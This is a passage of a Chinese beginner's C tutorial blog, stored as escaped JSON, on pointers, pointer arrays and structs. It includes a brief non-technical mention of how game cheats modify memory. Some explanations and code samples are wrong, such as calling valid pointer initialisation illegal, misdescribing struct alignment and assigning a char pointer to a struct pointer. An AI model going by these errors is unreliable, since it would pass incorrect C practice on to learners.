&lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        问题：怎么通过形参改变一个函数内实参的值？从外部更改函数内部的值\n*        函数的参数有副本机制(重新开辟一个内存)，除了数组。\n*        采用指针的方式从外部修改内部的值\n*&#x2F;\n\nint num(int a);\n&#x2F;* 我们采用指针的方式从外部修改内部的值 *&#x2F;\nvoid pnum(int *a);\n\nvoid main() &#123;\nint a &#x3D; 20;\nprintf(&quot;main a &#x3D; %p\\n&quot;, &amp;a);\nint b &#x3D; num(a);        &#x2F;&#x2F; 我们传入num的a的值为20 那么输出是10 还是 20：答案是：10 (创建副本)\n\nprintf(&quot;b &#x3D; %d\\n&quot;, b);\n\nint c &#x3D; 100;\npnum(&amp;c);\nprintf(&quot;c &#x3D; %d\\n&quot;, c);\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n\nint num(int a) &#123;\na &#x3D; 10;\nprintf(&quot;num  a &#x3D; %p\\n&quot;, &amp;a);\nreturn a;\n&#125;\n\nvoid pnum(int* a) &#123;\n*a &#x3D; 10;\n&#125;\n指针数组指针数组实际上就是指针类型的数组。当然还有一种叫数组指针，实际上就是指向数组的指针。注意：指针数组是指针类型的数组，数组指针是指向数组的指针\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\nint a &#x3D; 1;\nint b &#x3D; 2;\nint c &#x3D; 3;\n\nint d[4] &#x3D; &#123; 1,2,3,4 &#125;;\n\nfor (int i &#x3D; 0; i &lt; 4; i++) &#123;\nprintf(&quot;%d\\n&quot;, d[i]);\n&#125;\n\nchar *pa[] &#x3D; &#123; &quot;a&quot;,&quot;b&quot;,&quot;c&quot; &#125;;        &#x2F;&#x2F; 指针数组 &quot;a&quot;在指针常量区，&quot;a&quot;存储的实际上是地址\n&#x2F;&#x2F; 当然还有一种叫数组指针，实际上就是指向数组的指针\n&#x2F;&#x2F; 注意：指针数组是指针类型的数组，数组指针是指向数组的指针\n&#x2F;&#x2F; 断点\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;        &#x2F;&#x2F; 这里+1是加了一个地址的长度\nprintf(&quot;%s\\n&quot;, pa[i]);        &#x2F;&#x2F; 这里i也是一个地址的长度\n&#125;\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n5.1.3 结构体基本操作结构体类型定义结构体变量定义结构体变量初始化Typedef 改变类型名注意：结构体也是一种数据类型，是我们自定义的类型。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        结构体就是自定义的数据类型语法：struct 类型名好比我们的int float。\n*&#x2F;\n\n&#x2F;* 结构体类型定义第一种方式 *&#x2F;\nstruct Test &#123;\nchar face[10];\nint EyesSize;\n\n&#125;;\n\n&#x2F;* 结构体变量定义第一种方式 (声明赋值二合一) *&#x2F;\nstruct Test test &#x3D; &#123; &quot;Hello&quot;,20 &#125;;        &#x2F;&#x2F; 和定义 int a;一样，但是结构体是struct Test &#x3D;&#x3D; int\n\n&#x2F;* 结构体类型定义第二种方式 *&#x2F;\nstruct Test02 &#123;\nchar face[10];\nint EyesSize;\n&#125;test02 &#x3D; &#123;&quot;World&quot;,15&#125;;        &#x2F;&#x2F; 直接在下面定义变量\n\n&#x2F;* 结构体类型定义第三种 *&#x2F;\nstruct &#123;\nchar face[10];\nint EyesSize;\n&#125;test03,test04;        &#x2F;&#x2F; 匿名结构体，这个结构体只能使用在下面定义好的变量\n\n&#x2F;* 结构体类型定义第四种 *&#x2F;\ntypedef struct Test05 &#123;\nchar face[10];\nint EyesSize;\n&#125;Test05;        &#x2F;&#x2F; tyoedef 是别名，它将 struct Test05 替换成 Test05 这样我们就可以少写一个\n\nTest05 test05 &#x3D; &#123; &quot;Love&quot;,520 &#125;;\n\nvoid main() &#123;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n结构体初始化注意：Test结构体它声明的时候是不开辟内存的，你必须初始化对象才开辟内存。箭头运算符 ：用于指针来调用变量的一种方式。test.face &#x3D; { “Hello” }; 这样的化会出错，它不是指针(不能往指针的地址里拷贝字符串)。所以我们要用到Strcpy函数。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Test &#123;\nchar face[10];\nint EyesSize;\nchar* str;\n&#125;Test;\n\nvoid main(void) &#123;\nTest test;\n&#x2F;&#x2F; test.face &#x3D; &#123; &quot;Hello&quot; &#125;; 这样的化会出错，它不是指针(不能往指针的地址里拷贝字符串)。所以我们要用到Strcpy函数\nstrcpy(test.face,&quot;Hello&quot;);\ntest.str &#x3D; &quot;World&quot;;\ntest.EyesSize &#x3D; 15;\nfor (char* p &#x3D; test.str; p &lt; test.str + 6; p++) &#123;\nprintf(&quot;%c&quot;, *p);\n&#125;\n\nTest test02 &#x3D; &#123; &quot;Hello&quot;,15,&quot;Arvin&quot;&#125;;\nprintf(&quot;%s %d\\n&quot;, test.face, test.EyesSize);\nprintf(&quot;%s %d %s\\n&quot;, test02.face, test02.EyesSize, test02.str);\n\nTest test01;\n&#x2F;* 箭头运算符 ：用于指针来调用变量的一种方式 *&#x2F;\nTest* p_test &#x3D; NULL;        &#x2F;&#x2F; 这个指针指向我们的结构体\np_test &#x3D; &amp;test01;        &#x2F;&#x2F; 初始化一个结构体的对象\nstrcpy(p_test-&gt;face, &quot;Hello&quot;);\np_test-&gt;EyesSize &#x3D; 100;        &#x2F;&#x2F; 指针通过箭头运算符调用结构体里的内容\np_test-&gt;str &#x3D; &quot;World&quot;;\nprintf(&quot;%s %d %s\\n&quot;, p_test-&gt;face, p_test-&gt;EyesSize, p_test-&gt;str);\n\n&#x2F;**\n*        报错：Test结构体它声明的时候是不开辟内存的，你必须初始化对象才开辟内存。\n*&#x2F;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n如果你在p_test-&gt;EyesSize &#x3D; 100;非要用*的方式也不是不可以：(*p_test).EyesSize &#x3D; 100;\n结构体变量之间赋值#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        我们定义结构体的时候不开辟内存。\n*        在声明变量的时候才会开辟内存 ModelFace modelFace &#x3D; &#123; &quot;Hello&quot;,50 &#125;;\n*        注意：赋值完成后它们就没有关系了\n*&#x2F;\n\ntypedef struct ModelFace &#123;\nchar face[10];\nint EyesSize;\n&#125;ModelFace;\n\nvoid main56(void) &#123;\nModelFace modelFace &#x3D; &#123; &quot;Hello&quot;,50 &#125;;\n\n&#x2F;* 结构体变量之间可以相互赋值 *&#x2F;\nModelFace modeF &#x3D; modelFace;\n\nprintf(&quot;%s %d\\n&quot;, modeF.face, modeF.EyesSize);\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n结构体静态数组-栈区#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        结构体定义数组-在栈区开辟\n*        注意类比\n*&#x2F;\ntypedef struct ModelFace &#123;\nchar face[10];\nint EyesSize;\n&#125;ModelFace;\n\nvoid main() &#123;\nint a[3] &#x3D; &#123; 1,2,3 &#125;;\n\n&#x2F;* 结构体数组有两种定义方式 *&#x2F;\nModelFace modelFace[3] &#x3D; &#123; &quot;Gun&quot;,100,&quot;Liyun&quot;,50,&quot;Note&quot;,10 &#125;;\nModelFace modelF[3] &#x3D; &#123; &#123;&quot;Fun&quot;,100&#125;,&#123;&quot;Miun&quot;,50&#125;,&#123;&quot;Mote&quot;,10&#125; &#125;;\n\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nprintf(&quot;ModeFace：%d %s %d\\n&quot;, i, modelFace[i].face, modelFace[i].EyesSize);\nprintf(&quot;ModeF   ：%d %s %d\\n&quot;, i, modelF[i].face, modelF[i].EyesSize);\n&#125;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n结构体动态数组-堆区#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        结构体动态数组-堆区\n*        注意类比\n*&#x2F;\n\nstruct ModelFace &#123;\nchar face[10];\nint EyesSize;\n&#125;;\n\nvoid main() &#123;\n\nint a[3] &#x3D; &#123; 0 &#125;;\nint* pa &#x3D; (int*)malloc(3 * sizeof(int)); &#x2F;&#x2F; 开辟堆区内存\nfree(pa);\npa &#x3D; NULL;\n\n&#x2F;* 结构体动态数组 *&#x2F;\nstruct ModelFace modelFace[3] &#x3D; &#123; 0 &#125;;\nstruct ModelFace* p_str &#x3D; (struct ModelFace*)malloc(3 * sizeof(struct ModelFace));\nif (p_str &#x3D;&#x3D; NULL) &#123;\nreturn NULL;\n&#125;\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nstrcpy(p_str[i].face, &quot;Arvin&quot;);\np_str[i].EyesSize &#x3D; 10 + i;\n&#125;\nfor (int i &#x3D; 0; i &lt; 3; i++) &#123;\nprintf(&quot;modelFace %d ：%s %d\\n&quot;, i, p_str[i].face, p_str[i].EyesSize);\n&#125;\nif (p_str !&#x3D; NULL) &#123;\nfree(p_str);\np_str &#x3D; NULL;\n&#125;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n结构体嵌套数组#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        结构体嵌套指针\n*        如果结构体内部有个指针能否直接给指针拷贝内容：答案是可以的\n*&#x2F;\n\n\ntypedef struct ModelFace &#123;\nchar* face;\nint EyesSize;\n&#125;ModelFace;\n\nvoid main59(void) &#123;\nprintf(&quot;请输入您的姓名：&quot;);\nchar Mname[10] &#x3D; &#123; 0 &#125;;\nint* age &#x3D; 0;\nscanf(&quot;%s&quot;,Mname);\nchar* name &#x3D; NULL;\nname &#x3D; (char*)malloc(10);\nstrcpy(name, Mname);\nprintf(&quot;name：%s\\n&quot;, name);\nif (name !&#x3D; NULL) &#123;\nfree(name);\nname &#x3D; NULL;\n&#125;\n&#x2F;* 结构体 *&#x2F;\nModelFace modelFace;\nmodelFace.face &#x3D; (char*)malloc(10);\nstrcpy(modelFace.face, Mname);\nmodelFace.EyesSize &#x3D; 18;\nprintf(&quot;ModeFace：name:%s age:%d&quot;, modelFace.face, modelFace.EyesSize);\nif (modelFace.face !&#x3D; NULL) &#123;\nfree(modelFace.face);\nmodelFace.face &#x3D; NULL;\n&#125;\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\n结构体赋值细节在程序流程时如果你不知道大小可以采用strlen函数\nfor (int i &#x3D; 0; i &lt; strlen(Name); i++) &#123;        &#x2F;&#x2F; 如果你不知道大小可以采用strlen函数\npMyStruct-&gt;hello[i] &#x3D; Name[i];\n&#125;\n结构体赋值第一部分\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct MyStruct &#123;\nchar hello[10];\nint a;        &#x2F;&#x2F;第二次加个一个int类型测试\n&#125;MyStruct;\n\nvoid main() &#123;\nint a;\nprintf(&quot;a：%d\\n&quot;, sizeof(a));        &#x2F;&#x2F; 4字节，int是系统做好的类型\n\nMyStruct myStruct;\nprintf(&quot;myStruct：%d\\n&quot;, sizeof(myStruct));        &#x2F;&#x2F; 10字节，我们自定义变量 加上int为16字节（因为结构体内存对齐）\nstrcpy(myStruct.hello, &quot;A&quot;);\nprintf(&quot;myStruct.hello：%d\\n&quot;, sizeof(myStruct.hello));\nprintf(&quot;myStruct.a：%d\\n&quot;, sizeof(myStruct.a));        &#x2F;&#x2F; 4字节，为什么会消失2字节？\n\n&#x2F;**\n* 结构体在开辟内存的时候，可能因为变量不同。系统会不确定分配多少内存。\n* 所以会尽可能的分配大一点的内存，按照结构体里最大类型的2的倍数进行分配。\n*&#x2F;\n\nMyStruct* pMyStruct &#x3D; &amp;myStruct;\nprintf(&quot;*pMyStruct：%d\\n&quot;, sizeof(*pMyStruct));        &#x2F;&#x2F; 16字节 指向我们的内存：myStruct。\nprintf(&quot;pMystruct：%d\\n&quot;, sizeof(pMyStruct));                &#x2F;&#x2F; 4|8字节，指针的内存是固定的\nstrcpy(pMyStruct-&gt;hello, &quot;Hello&quot;);\npMyStruct-&gt;a &#x3D; 50;\nprintf(&quot;pMystruct：%s %d\\n&quot;, pMyStruct-&gt;hello, pMyStruct-&gt;a);\n\nchar name[10];\nprintf(&quot;输入你要的pMyStruct的值：&quot;);\nscanf(&quot;%s&quot;, name);\n&#x2F;&#x2F; 需要注意的是我们不能通过 char name&#123;1，2，3&#125;;来修改，它存在于栈区，我们只能修改&quot;字符串&quot;\nstrcpy(pMyStruct-&gt;hello, name);\n&#x2F;&#x2F; 当然你可以char* name &#x3D; Hello，然后传入进去\nprintf(&quot;pMyStruct：%s %d\\n&quot;, pMyStruct-&gt;hello, pMyStruct-&gt;a);\n\n&#x2F;&#x2F; 如果非要传入&#123;&#125;可以有以下方法\nchar Name[10] &#x3D; &#123; &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39; &#125;;\n&#x2F;&#x2F; 栈区数组赋值\nfor (int i &#x3D; 0; i &lt; strlen(Name); i++) &#123;        &#x2F;&#x2F; 如果你不知道大小可以采用strlen函数\npMyStruct-&gt;hello[i] &#x3D; Name[i];\n&#125;\nprintf(&quot;pMyStruct：%s %d\\n&quot;, pMyStruct-&gt;hello, pMyStruct-&gt;a);\n\n&#x2F;&#x2F; 如果我们把采用strcpy还可以采用\nchar* pName &#x3D; &quot;ZhangSan&quot;;\nif (pMyStruct &#x3D;&#x3D; NULL) &#123;\nreturn NULL;\n&#125;\nfor (int i &#x3D; 0; i &lt; 9; i++) &#123;\npMyStruct-&gt;hello[i] &#x3D; pName[i];\n&#125;\nprintf(&quot;pMyStruct：%s %d\\n&quot;, pMyStruct-&gt;hello, pMyStruct-&gt;a);\npName &#x3D; &quot;LiSi&quot;;\nfor (pMyStruct &#x3D; pName; pMyStruct &lt; pName + 5; pMyStruct++) &#123;\nprintf(&quot;pMyStruct： %s\\n&quot;, pMyStruct-&gt;hello);\n&#125;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\nC语言赋值细节二#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nMyStruct* Test();\n\ntypedef struct MyStruct &#123;\nchar* Hello;\n&#125;MyStruct;\n\nvoid main(void) &#123;\n\nMyStruct myStruct;\nMyStruct* pMyStruct &#x3D; &amp;myStruct;\n\n&#x2F;**\n*        字符串是不动的常量，在内存中是以下的表现：\n*        const char* H &#x3D; &quot;Arvin&quot;\n*        它在全局区是不可更改的，我们通过指针地址将它赋值给pMySruct，说白了就是地址的转移。\n*&#x2F;\nchar* H &#x3D; &quot;Arvin&quot;;\npMyStruct-&gt;Hello &#x3D; H;\n\n&#x2F;**\n*        I是在栈区的数组。\n*        pMyStruct是在Main函数中的所以下面不会出问题。\n*        如果在外部函数中这样，需要讲值传递置堆区。\n*        栈区是先进后出的模型运行的，Main函数先进，所以当Test进入，出去时候将值传给了Main还是可以正常运行的。\n*        此处涉及主调函数、被调函数、函数调用模型有关系。\n*&#x2F;\nchar I[10] &#x3D; &#123; &#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;&#125;;\npMyStruct-&gt;Hello &#x3D; I;\n\nprintf(&quot;%s\\n&quot;, pMyStruct-&gt;Hello);\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\nC语言实现界面#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main(void) &#123;\nputs(&quot;\\n&quot;);\nputs(&quot;\\n&quot;);\nputs(&quot;\\t\\t ---------------------------&quot;);\nputs(&quot;\\t\\t|   Leve1:1                 |&quot;);\nputs(&quot;\\t\\t|   Leve1:2                 |&quot;);\nputs(&quot;\\t\\t|   Leve1:3                 |&quot;);\nputs(&quot;\\t\\t|   Leve1:4                 |&quot;);\nputs(&quot;\\t\\t|   Leve1:5                 |&quot;);\nputs(&quot;\\t\\t ---------------------------&quot;);\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\nDos窗口的大小为：宽80字符高25字符一个\\t的是8个字符。\nputs和printf的区别和putchar的区别printf、pytchar和puts函数均为输出函数。printf函数可以输出各种不同类型的数据，putchar函数只能输出字符数据，而puts函数可输出字符串数据。puts(s)的作用与语句printf(“%s”,s)的作用基本相同，puts函数只能输出字符串，不能输出1数值或进行格式变换，puts函数在输出字符它自带换行。\n结构体保存数据C语言没有类的概念，我们做一些属性的时候，只能是往结构体里保存。\n#define _CRT_SECURE_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Info &#123;\nchar Name[10];\nchar Gender[10];\ndouble Height;\nunsigned short Age;\n&#125;Info;\n\nvoid main(void) &#123;\nInfo info &#x3D; &#123; 0,0,0,0 &#125;;        &#x2F;&#x2F; 初始化，如果字符类型没有初始化可能就直接报错\n&#x2F;&#x2F; 断点调试\n\n&#x2F;* 值指向 info 的数组指针 *&#x2F;\nInfo* pInfo &#x3D; &amp;info;\n\n&#x2F;* 写入数据 *&#x2F;\nprintf(&quot;请输入您的姓名：&quot;);\nscanf(&quot;%s&quot;, pInfo-&gt;Name);\nprintf(&quot;您的姓名是：%s\\n&quot;, pInfo-&gt;Name);\n\nprintf(&quot;请输入你的性别：&quot;);\nscanf(&quot;%s&quot;, pInfo-&gt;Gender);\nprintf(&quot;您的性别为：%s\\n&quot;, pInfo-&gt;Gender);\n\nif ((!strcmp(pInfo-&gt;Gender,&quot;男&quot;)) || (!strcmp(pInfo-&gt;Gender,&quot;男生&quot;))) &#123; &#x2F;&#x2F; 这个函数比较特殊，需要反转一下\nprintf(&quot;请输入您的身高：&quot;);\nscanf(&quot;%lf&quot;,  &amp;pInfo-&gt;Height);                &#x2F;&#x2F; 注意是 LF\nprintf(&quot;您的身高为：%g\\n&quot;, pInfo-&gt;Height);\n\nprintf(&quot;请输入您的年龄：&quot;);\nscanf(&quot;%u&quot;, &amp;pInfo-&gt;Age);\nprintf(&quot;你的年龄为：%u\\n&quot;, pInfo-&gt;Age);\n&#125;\n\nprintf(&quot;\\n&quot;);\nsystem(&quot;pause&quot;);\n&#125;\nstrcmp 的作用比较字符串，0代表两个相同，非0代表两个字符串不相同。\n","slug":"C_2022_3.13.01","date":"2022-03-13T06:22:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"bc8f9b6164f4278e84078fb333015364","title":"C语言指针(上)","content":"5.0.1 外挂原理与指针什么是内存？从硬件形态上来说，内存就是一条形物理设备，从功能上来讲，内存是一个数据仓库，程序在执行前都要被装载到内存中，才能被中央处理器执行。内存是由按顺序编号的一系列存储单元组成的，在内存中，每个存储单元都有唯一的地址，通过地址可以方便地在内存单元中存储信息。在计算机中，一切信息都是以二进制数据的形式体现的，每个内存单元的容量是 1B，即 8Bit（8个0、1二进制位）。内存与CPU读写速度快，断电就没有了，容量比较小，成本比较搞，高级服务器，读写很频繁的文件全部存放内存，顶级黑客的电脑是没有硬盘的。\n变量名是什么？概念：既能读又能写的内存对象，称为变量；若一旦初始化后不能修改的对象则称之为常量。变量定义形式：类型，标识符，标识符，……，标识符；变量名就是对内存一段空间里面的数据的抽象。int a &#x3D; 10; double b &#x3D; 20;例1：查看内存中定义的变量的地址\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\n&#x2F;&#x2F; a其实的地址的别名\nint a &#x3D; 10;\nprintf(&quot;%p\\n&quot;, &amp;a);\n\nsystem(&quot;pause&quot;);\n&#125;\n变量的本质程序通过变量来申请和命名内存空间 int a &#x3D;0;通过变量名访问内存空间。结论：变量：一段连续内存空间的别名。数据类型和变量的关系，通过通过数据类型定义变量。一个程序载入内存，代码数据都有地址，外挂就是调用函数，修改数据。而函数就是代码，变量就是数据。总结：对内存，可读可写。通过变量往内存读写数据。不是向变量读写数据，而是向变量所代表的内存空间中写数据。名字就是变量，地址是身份证，外号是引用。姓名可以看作是身份证号的别名。\n5.0.2 指针的基本语法指针的作用：操作内存注意：地址就是你的身份证号，变量就是你的名字举例：唯一真名\n*号和&amp;号的意思：取地址运算符&amp;，间接运算符*&amp;运算符：取地址运算符，&amp;m 即是变量m在内存中的实际地址。运算符：指针运算符（通常称为间接引用运算符）它返回其操作数（即一个指针）所指向的对象的值。指针的大小是固定的，指针的大小和类型无关，指针的类型与步长（+1后所得到的值，指针的步长和指针数组有很大联系）有关。无论什么类型下指针变量的类型永远是： 64bit环境下是8字节 32bit环境下是4字节需要注意的是：charp &#x3D; &amp;H；它的类型要保持和 char H &#x3D; ‘A’；的一致否则会出现对溢出内存的赋值。例：打印一个值的地址：\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint loser &#x3D; 38;\n\nprintf(&quot;%p\\n&quot;, &amp;loser);        &#x2F;&#x2F; &amp;取地址，返回其变量真实地址\n\nsystem(&quot;pause&quot;);\n&#125;\n指针变量语法其基本形式为：类型* 指针变量名；\nint b &#x3D; 10;\nint *a &#x3D; &amp;b;\nint *p &#x3D; NULL;\np &#x3D; &amp;b;\n需要注意的是指针和指针变量是两种概念。指针指的是地址，指针变量指的是存放指针的变量。还需要注意指针变量需要初始化。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint loser &#x3D; 38;\n\nprintf(&quot;%p\\n&quot;, &amp;loser);        &#x2F;&#x2F; &amp;取地址，返回其变量真实地址\n\nint* p &#x3D; &amp;loser;        &#x2F;&#x2F; 声明一个*p，它现在就是一个指针变量，它存储的是loser的内存地址，这样是声明与赋值二合一\n\n*p &#x3D; 3800;        &#x2F;&#x2F; 修改地址的值为：3800。我们通过*间接的修改了loser的值\n\nprintf(&quot;%d\\n&quot;, loser);        &#x2F;&#x2F; 现在loser的值为：3800\n\n&#x2F;* 通常声明可以采用这样的形式，但必须要初始化 *&#x2F;\nint* pa &#x3D; NULL;        &#x2F;&#x2F;如果不初始化会出现问题\npa &#x3D; &amp;loser;        &#x2F;&#x2F; pa获取loser的内存地址\n*pa &#x3D; 521;        &#x2F;&#x2F; 然后我们可以通过*p(通过地址)去修改loser的值。通过*来间接操作内存来修改变量的值\nprintf(&quot;%d\\n&quot;, loser);\n\n&#x2F;&#x2F; 总结：指针变量是一种变量，它可以存储任意类型的地址。*是用来操作地址的，&amp;是变量的的地址\n\nsystem(&quot;pause&quot;);\n&#125;\n总结：指针变量是一种变量，它可以存储任意类型的地址。*是用来操作地址的，&amp;是变量的的地址。*就是间接引用运算符，它就是通过地址间接去操作变量的值。就是通过地址找内存。例如：网名：小帅哥  ID账号：123456&amp;就是直接去拿ID账号，网名就是变量名。我们添加好友用ID账号。就相当于通过ID账号查找内存进而操控。注意：变量就是指针变量，指针是一种概念。如果还是不懂 * 和 &amp; 就另请大佬\n指针的详解\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\nint a &#x3D; 250;\n*(&amp;a) &#x3D; 38;        &#x2F;&#x2F; 这个实际上和 a &#x3D; 38 一样，但是这个是通过指针的方式来实现的。*操作(&amp;a)变量地址的值 &#x3D; 38\nprintf(&quot;%d\\n&quot;, a);\n\nint* p &#x3D; NULL;        &#x2F;&#x2F; 此处没有任何操作，只是声明和初始化一个指针变量\np &#x3D; &amp;a;\nprintf(&quot;%p\\n&quot;, p);        &#x2F;&#x2F; p 在这里存储的是a的内存地址\n*p &#x3D; 200;        &#x2F;&#x2F; p加上一个*号我们就可以修改a的值(通过内存地址修改)\nprintf(&quot;%d\\n&quot;, a);\n\nsystem(&quot;pause&quot;);\n&#125;\n指针练习一需要注意的是：charp &#x3D; &amp;H；它的类型要保持和 char H &#x3D; ‘A’；的一致否则会出现对溢出内存的赋值。如果将char p &#x3D; &H; 改成 int p &#x3D; &amp;H’;int  它指向的是整型空间，占4个字节，而指向的 H 只是一个字符型，占1个字节，那么*p &#x3D; ‘B’; 是错误的根据，它会导致对溢出空间的赋值。会报错如：run-time check failure #2 - stack around the variable ‘hello’ was corrupted.\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n&#x2F;**\n*        假设我知道了你的账号(内存地址)，我要修改你的网名(内存中的内容)\n*&#x2F;\n\nvoid main() &#123;\nchar H &#x3D; &#39;A&#39;;\nchar* p &#x3D; &amp;H;        &#x2F;&#x2F; 指针变量就是存地址的变量\n*p &#x3D; &#39;B&#39;;\nprintf(&quot;H的值为：%c\\n&quot;, H);\nprintf(&quot;p存储的地址为：%p\\n&quot;, p);\nprintf(&quot;p的地址为：%p\\n&quot;, &amp;p);        &#x2F;&#x2F; 指针变量的地址，好比黑客的号被盗了\n\n&#x2F;&#x2F; 黑客盗了 H的账号，有人盗了黑客的账号，能不能通过黑客的号找到 H 的号 ：答案是成立的\n&#x2F;&#x2F; 能不能通过黑客的账号去修改 H 的网名 ：可以的，采用二级指针\n&#x2F;&#x2F; 注意：存储指针变量的地址只能是二级指针\n\nH &#x3D; &#39;C&#39;;\nprintf(&quot;H&#x3D;&#39;C&#39;;的值为：%c\\n&quot;, H);\nprintf(&quot;通过地址获取的为：%c\\n&quot;, *p);        &#x2F;&#x2F; 通过地址去找内容\nsystem(&quot;pause&quot;);\n&#125;\n指针练习二\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint a &#x3D; 10;\nint* p &#x3D; NULL;\np &#x3D; &amp;a;\n*p &#x3D; 100;\nprintf(&quot;a &#x3D; %d\\n&quot;, a);\n\nchar* H &#x3D; NULL;\ndouble* D &#x3D; NULL;\n\nprintf(&quot;指针p的大小为：%d\\n&quot;, sizeof(p));\nprintf(&quot;指针H的大小为：%d\\n&quot;, sizeof(H));\nprintf(&quot;指针D的大小为：%d\\n&quot;, sizeof(D));\n\n&#x2F;&#x2F; 总结：无论什么类型下指针变量的类型永远是： 64bit环境下是8字节 32bit环境下是4字节\n\nsystem(&quot;pause&quot;);\n&#125;\n指针的变量和指针的概念（重点）“指针”是概念，“指针变量”是具体的实现，指针也是一个变量，所以需要进行定义，而对指针的定义，与一般变量一样。\n指针和指针变量的关系指针就是地址，地址就是指针。地址就是内存单元的编号。指针变量就是存放指针地址的变量。\n指针和指针变量是两个不同的概念，但要注意的是，通常我们叙述时会把指针变量简称为指针，实际他们的含义是不同的。指针变量也是一种变量，不同的是，指针变量只存储地址。指针变量既然是变量那么它的存储地址是可以改变的。不是固定的。注意区分指针变量的值和指针变量的地址。\n5.0.3 声明指针需要注意的点指针变量在使用之前必须进行初始化。\nint num &#x3D; 100;\nint *p;\np&#x3D;&amp;num;\n上面演示的代码是非法的，可以编译，运行报错，会把100当作一个地址。指针只是一个地址，大小是固定的，在32bit环境下是4字节，在64bit下是8字节。\n指针和地址的区别两个要点：指针是个量，对应着一块内存区域指针存储的信息是某个内存单元的地址比如：\nint a &#x3D; 10;\nint *p &#x3D; &amp;a;\n&amp;a 是一个地址，是一个常量。而p是一个指针变量，可以存储一个地址。比如：300500是一个地址，int p&#x3D;（int）300500是一个指针变量。p存储的是地址，指针有类型，从哪里开始，长度是多少，从哪里结束，得知了类型以后，就知道这片内存数据是如何解析。\n指针变量的声明与初始化：在声明一个指针后，编译器并不会自动完成其初始化，此时指针的值是不确定的，也就是说，该指针指向那块内存单元是完全随机的。如果在指针变量声明之初确实不知道该将此指针指向何处，最简单的方式是将其置为”0”,C语言中提供了关键字 NULL。\n取指针的过程是CPU寄存器产生的，不占用内存\n5.0.4 数组和指针（简单）数组名是数组的首元素的地址，同时也是数组地址。例如：\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint a[3] &#x3D; &#123; 1,2,3 &#125;;        &#x2F;&#x2F; 1值的地址和取数组的地址是一致的a[3]。&#123;1，2，3&#125;他们都要一个自己独立的内存地址\n&#x2F;** \n*        例如：白素贞 - 赵雅芝\n*        赵雅芝是白素贞的代表，但不能说赵雅芝就是白素贞。\n*        可以扮演白素贞的演员很多，说起白素贞就想起赵雅芝。\n*&#x2F;\nchar bai[] &#x3D; &#123; &#39;z&#39;,&#39;l&#39;,&#39;j&#39; &#125;;\n\nprintf(&quot;白素贞：    %p\\n&quot;, &amp;bai);\nprintf(&quot;赵雅芝：    %p\\n&quot;, bai);        &#x2F;&#x2F; 打印数组名，默认是打印数组首元素的地址\nprintf(&quot;数组首元素：%p\\n&quot;, &amp;bai[0]);        &#x2F;&#x2F; 此句与printf(&quot;赵雅芝：%p\\n&quot;, bai);功能一样\n\n&#x2F;**\n*        白素贞是个角色，谁都可以演：赵雅芝、周涛、菊花\n*        赵雅芝就是白素贞这个数组的第一个元素(首元素)\n*        它的地址就是数组的地址(一维数组下)\n*&#x2F;\n\nsystem(&quot;pause&quot;);\n&#125;\n总结：数组名就是表示数组首地址常量数组地址和数组首元素地址不同之处在于类型不一样。类型不一样导致步长不一样。例如：\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\nint b &#x3D; 10;        &#x2F;&#x2F; 分配4字节的内存\nint array[10] &#x3D; &#123; 1,2,3,4,5,6,7,8,9,10 &#125;;        &#x2F;&#x2F; 告诉编译器分配4*10 &#x3D; 40个字节的内存\nprintf(&quot;array：%p\\narray+1：%p\\narray：%p\\n&amp;array+1：%p\\n&quot;, array, array + 1, &amp;array, &amp;array + 